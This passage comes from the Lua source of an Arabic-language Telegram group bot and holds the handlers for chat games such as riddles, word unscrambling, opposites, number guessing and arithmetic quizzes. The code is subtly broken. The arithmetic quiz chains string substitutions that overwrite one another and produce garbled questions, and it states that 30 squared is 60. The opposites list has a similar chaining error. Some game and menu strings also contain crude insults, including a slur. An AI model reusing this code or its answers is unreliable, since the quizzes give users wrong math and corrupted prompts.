┤ كشف ܊ بالرد او بالمعرف ܊ 
┤ اسمي 
┤ المطور
┤ كول + الكلمه
┤ ╌╌╌╌╌╌╌╌╌╌ ܁ 
┤ ܁ NO.3
┤ بوسه ܊ بالرد ܊ 
┤ مصه ܊ بالرد  ܊
┤ شنو رائيك بهذا ܊ بالرد ܊
┘ رزله ٭ هينه ܊ بالرد ܊
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
𖤂┆[CHanneL SourcE](t.me/R_IQ9) 𖥠 .
]]
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == 'م10' or text == 'م١٠' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆عذرا الاوامر هذا لا تخصك ↝ ܰ ') 
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = datahso:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'👥┇ عذراً عليك الاشتراك في القناة\n📡┇قناة الاشتراك ['..datahso:get(bot_id..'add:ch:username')..']')
end
return false
end
Text = [[
܁༯┆ اهلا بيك عمري ↝ . 
܁༯┆اوامر التحشيش ▾ . 
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
┐ ܁ NO.1
┆رفع ܊ تنزيل + الامر ▿
┤ اثول
┤ جلب
┤ مطي
┤ صخل
┤ زاحف
┤ الرفع
┤ بكلبي
┤ تاج
┤ نبي
┤ ܁ NO.2 ▿
┤ زواج
┘ طلاك
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
𖤂┆[CHanneL SourcE](t.me/R_IQ9) 𖥠 .
]]
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == 'سمايلات' or text == 'سمايل' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔅┋عذراً عليك الاشتراك في القناة\n📌┋اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Games'..msg.chat_id_) then
database:del(bot_id..'Set:Sma'..msg.chat_id_)
Random = {'🍏','🍎','🍐','🍊','🍋','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🥖','🥐','🍞','🥨','🍟','🧀','🥚','??','🥓','🥩','🍗','🍖','🌭','🍔','🍠','🍕','🥪','🥙','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🎲','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🎟','🎫','🎗','🏵','🎖','🏆','🥌','🛷','🚗','🚌','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔','🛡','🔮','🌡','💣','📌','📍','📓','📗','📂','📅','📪','☑','📬','📭','⏰','📺','??','☎️','📡'}
SM = Random[math.random(#Random)]
database:set(bot_id..'Random:Sm'..msg.chat_id_,SM)
send(msg.chat_id_, msg.id_,'🔰┋ اسرع واحد يدز هذا السمايل ? » {`'..SM..'`}')
return false
end
end
if text == ''..(database:get(bot_id..'Random:Sm'..msg.chat_id_) or '')..'' and not database:get(bot_id..'Set:Sma'..msg.chat_id_) then
if not database:get(bot_id..'Set:Sma'..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'܁༯┆ويانا فائز ككلللوش 😂😭↝ ܰ')
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id..'Set:Sma'..msg.chat_id_,true)
return false
end 
if text == 'الاسرع' or text == 'ترتيب' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔅┋عذراً عليك الاشتراك في القناة\n📌┋اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Games'..msg.chat_id_) then
database:del(bot_id..'Speed:Tr'..msg.chat_id_)
KlamSpeed = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = KlamSpeed[math.random(#KlamSpeed)]
database:set(bot_id..'Klam:Speed'..msg.chat_id_,name)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
send(msg.chat_id_, msg.id_,'܁༯┆اسرع واحد يرتب ◃ ˼ '..name..' ˹ ?? ܰ')
return false
end
end
------------------------------------------------------------------------
if text == ''..(database:get(bot_id..'Klam:Speed'..msg.chat_id_) or '')..'' and not database:get(bot_id..'Speed:Tr'..msg.chat_id_) then
if not database:get(bot_id..'Speed:Tr'..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'܁༯┆ويانا فائز ككلللوش 😂😭↝ ܰ')
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id..'Speed:Tr'..msg.chat_id_,true)
end 

if text == 'حزوره' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔅┋عذراً عليك الاشتراك في القناة\n📌┋اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Games'..msg.chat_id_) then
database:del(bot_id..'Set:Hzora'..msg.chat_id_)
Hzora = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','خطأ','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = Hzora[math.random(#Hzora)]
database:set(bot_id..'Klam:Hzor'..msg.chat_id_,name)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'خطأ','ما هي الكلمه الوحيده التي تلفض خطأ دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
send(msg.chat_id_, msg.id_,'܁༯┆اسرع واحد يحل الحزوره ↝ ܰ\n܁༯┆܊ '..name..' ܊')
return false
end
end
------------------------------------------------------------------------
if text == ''..(database:get(bot_id..'Klam:Hzor'..msg.chat_id_) or '')..'' and not database:get(bot_id..'Set:Hzora'..msg.chat_id_) then
if not database:get(bot_id..'Set:Hzora'..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'܁༯┆ويانا فائز ككلللوش 😂😭↝ ܰ')
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id..'Set:Hzora'..msg.chat_id_,true)
end 

if text == 'معاني' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔅┋عذراً عليك الاشتراك في القناة\n📌┋اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Games'..msg.chat_id_) then
database:del(bot_id..'Set:Maany'..msg.chat_id_)
Maany_Rand = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = Maany_Rand[math.random(#Maany_Rand)]
database:set(bot_id..'Maany'..msg.chat_id_,name)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐀')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
send(msg.chat_id_, msg.id_,'܁༯┆اسرع واحد يدز معنى  ◃ ˼ '..name..' ˹ ↝ ܰ')
return false
end
end
------------------------------------------------------------------------
if text == ''..(database:get(bot_id..'Maany'..msg.chat_id_) or '')..'' and not database:get(bot_id..'Set:Maany'..msg.chat_id_) then
if not database:get(bot_id..'Set:Maany'..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'܁༯┆ويانا فائز ككلللوش 😂😭↝ ܰ')
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id..'Set:Maany'..msg.chat_id_,true)
end 
if text == 'العكس' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔅┋عذراً عليك الاشتراك في القناة\n📌┋اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Games'..msg.chat_id_) then
database:del(bot_id..'Set:Aks'..msg.chat_id_)
katu = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = katu[math.random(#katu)]
database:set(bot_id..'Set:Aks:Game'..msg.chat_id_,name)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'موحلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'عدل','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
send(msg.chat_id_, msg.id_,'🔰┋ اسرع واحد يدز العكس » {'..name..'}')
return false
end
end
------------------------------------------------------------------------
if text == ''..(database:get(bot_id..'Set:Aks:Game'..msg.chat_id_) or '')..'' and not database:get(bot_id..'Set:Aks'..msg.chat_id_) then
if not database:get(bot_id..'Set:Aks'..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'܁༯┆ويانا فائز ككلللوش 😂😭↝ ܰ')
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id..'Set:Aks'..msg.chat_id_,true)
end 

if database:get(bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
send(msg.chat_id_, msg.id_,"📬┋ عذرآ لا يمكنك تخمين عدد اكبر من ال { 20 } خمن رقم ما بين ال{ 1 و 20 }\n")
return false  end 
local GETNUM = database:get(bot_id.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
database:del(bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_)
database:del(bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_,5)  
send(msg.chat_id_, msg.id_,'🔖┋ مبروك فزت ويانه وخمنت الرقم الصحيح\n🚸┋ تم اضافة { 5 } من النقاط \n')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
database:incrby(bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(database:get(bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
database:del(bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_)
database:del(bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,'📮┋ اوبس لقد خسرت في اللعبه \n📬┋ حظآ اوفر في المره القادمه \n🔰┋ كان الرقم الذي تم تخمينه { '..GETNUM..' }')
else
send(msg.chat_id_, msg.id_,'📛┋ اوبس تخمينك خطأ \n📌┋ ارسل رقم تخمنه مره اخرى ')
end
end
end
end
if text == 'خمن' or text == 'تخمين' then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔅┋عذراً عليك الاشتراك في القناة\n??┋اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Games'..msg.chat_id_) then
Num = math.random(1,20)
database:set(bot_id.."GAMES:NUM"..msg.chat_id_,Num) 
send(msg.chat_id_, msg.id_,'\n܁༯┆اهلاً بيك عمري في لعبة التخمين ↝ ܰ\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n܁༯┆#ملاحضة لديك 3 محاولات فقط\n܁༯┆سيتم تخمين عدد ما بين ܊ 20 - 1 ܊\n܁༯┆اذا تعتقد انك يمكنك الفوز جرب والعب الان')
database:setex(bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end

if database:get(bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
send(msg.chat_id_, msg.id_,"📬┋ عذرا لا يوجد سواء { 6 } اختيارات فقط ارسل اختيارك مره اخرى\n")
return false  end 
local GETNUM = database:get(bot_id.."Games:Bat"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
database:del(bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,'܁༯┆ويانا فائز ككلللوش 😂😭↝ ܰ')
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_,3)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
database:del(bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,'܁༯┆لقد خسرت 😭↝ ܰ \n܁༯┆المحبس في اليد رقم ˼ '..GETNUM..' ˹ ↝ ܰ')
end
end
end

if text == 'محيبس' or text == 'بات' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔅┋عذراً عليك الاشتراك في القناة\n📌┋اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Games'..msg.chat_id_) then   
Num = math.random(1,6)
database:set(bot_id.."Games:Bat"..msg.chat_id_,Num) 
TEST = [[
܁༯┆في اي يد يقع المحبس ↝ ܰ
━━━ ━━━━━━━━━ ━━━━━
٭ 👊🏻6 ٭ 👊🏻5 ٭ 👊🏻4 ٭ 👊🏻3 ٭ 👊🏻2 ٭ 👊🏻1 ٭
━━━ ━━━━━━━━ ━━━━━━
܁༯┆اختار رقم لاستخراج المحبس  من اليد الذي تحمل المحبس
܁༯┆الفائز يحصل على  ◃ 5 ▹ نقاط
]]
send(msg.chat_id_, msg.id_,TEST)
database:setex(bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end

------------------------------------------------------------------------
if text == 'المختلف' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔅┋عذراً عليك الاشتراك في القناة\n??┋اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Games'..msg.chat_id_) then
mktlf = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','✨','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍??','👩‍🍳','🧚‍♀','🧜‍♂','🧝‍♂','🙍‍♂','🧖‍♂','👬','??‍👨‍👧','🕒','🕤','⌛️','📅',};
name = mktlf[math.random(#mktlf)]
database:del(bot_id..'Set:Moktlf:Bot'..msg.chat_id_)
database:set(bot_id..':Set:Moktlf'..msg.chat_id_,name)
name = string.gsub(name,'😸','😹😹😹😹😹😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠','💀💀💀💀💀💀💀☠💀💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻🐼👻👻👻👻👻👻👻')
name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚🌚')
name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟🌟🌟⭐️🌟🌟🌟')
name = string.gsub(name,'✨','💫💫💫💫💫✨💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨🌨🌨⛈🌨🌨🌨🌨')
name = string.gsub(name,'🌥','⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃☃☃☃☃☃⛄️☃☃☃☃')
name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👩‍‍💻👩‍‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻')
name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'😂','👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳')
name = string.gsub(name,'🧚‍♀','🧚‍♂🧚‍♂🧚‍♂🧚‍♂🧚‍♀🧚‍♂🧚‍♂')
name = string.gsub(name,'🧜‍♂','🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧚‍♂🧜‍♀🧜‍♀🧜‍♀')
name = string.gsub(name,'🧝‍♂','🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♂🧝‍♀🧝‍♀🧝‍♀')
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️??‍♂️🙍‍♂️??‍♂️🙎‍♂️🙎‍♂️')
name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👭👬👭👭👭')
name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👧 👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕒','🕒🕒🕒🕒🕒🕒🕓🕒🕒🕒')
name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆??📆📆📆??📅📆📆')
send(msg.chat_id_, msg.id_,'܁༯┆اسرع واحد يدز  ◃ ˼ '..name..' ˹ ↝ ܰ')
return false
end
end
------------------------------------------------------------------------
if text == ''..(database:get(bot_id..':Set:Moktlf'..msg.chat_id_) or '')..'' then 
if not database:get(bot_id..'Set:Moktlf:Bot'..msg.chat_id_) then 
database:del(bot_id..':Set:Moktlf'..msg.chat_id_)
send(msg.chat_id_, msg.id_,'܁༯┆ويانا فائز ككلللوش ??😭↝ ܰ')
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id..'Set:Moktlf:Bot'..msg.chat_id_,true)
end
------------------------------------------------------------------------
if text == 'رياضيات' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔅┇عذراً عليك الاشتراك في القناة\n📌┇اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Games'..msg.chat_id_) then
Hussein = {'9','2','60','9','5','4','25','10','17','15','39','5','16',};
name = Hussein[math.random(#Hussein)]
database:del(bot_id..'Set:Ryadeat:Bot'..msg.chat_id_)
database:set(bot_id..':Set:Ryadeat'..msg.chat_id_,name)
name = string.gsub(name,'9','2+7=')
name = string.gsub(name,'2','5-3=')
name = string.gsub(name,'60','(30)² =')
name = string.gsub(name,'9','2+2+5=')
name = string.gsub(name,'5','8-3=?')
name = string.gsub(name,'4','40÷10=')
name = string.gsub(name,'25','30-5=')
name = string.gsub(name,'10','100÷10=')
name = string.gsub(name,'17','10+5+2=')
name = string.gsub(name,'15','25-10=')
name = string.gsub(name,'39','44-5=')
name = string.gsub(name,'5','12+1-8=')
name = string.gsub(name,'16','16+16-16=')
send(msg.chat_id_, msg.id_,'اجب عن التالي ~ {'..name..'}')
return false
end
end
------------------------------------------------------------------------
if text == ''..(database:get(bot_id..':Set:Ryadeat'..msg.chat_id_) or '')..'' then 
if not database:get(bot_id..'Set:Ryadeat:Bot'..msg.chat_id_) then 
database:del(bot_id..':Set:Ryadeat'..msg.chat_id_)
send(msg.chat_id_, msg.id_,'܁༯┆ويانا فائز ككلللوش 😂😭↝ ܰ')
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id..'Set:Ryadeat:Bot'..msg.chat_id_,true)
end
------------------------------------------------------------------------
if text == 'انكليزي' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔅┇عذراً عليك الاشتراك في القناة\n📌┇اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Games'..msg.chat_id_) then
Hussein = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','مختلف','سدني','نقود','اعلم','ذئب','تمساح','ذكي',};
name = Hussein[math.random(#Hussein)]
database:del(bot_id..'Set:English:Bot'..msg.chat_id_)
database:set(bot_id..':Set:English'..msg.chat_id_,name)
name = string.gsub(name,'ذئب','Wolf')
name = string.gsub(name,'معلومات','Information')
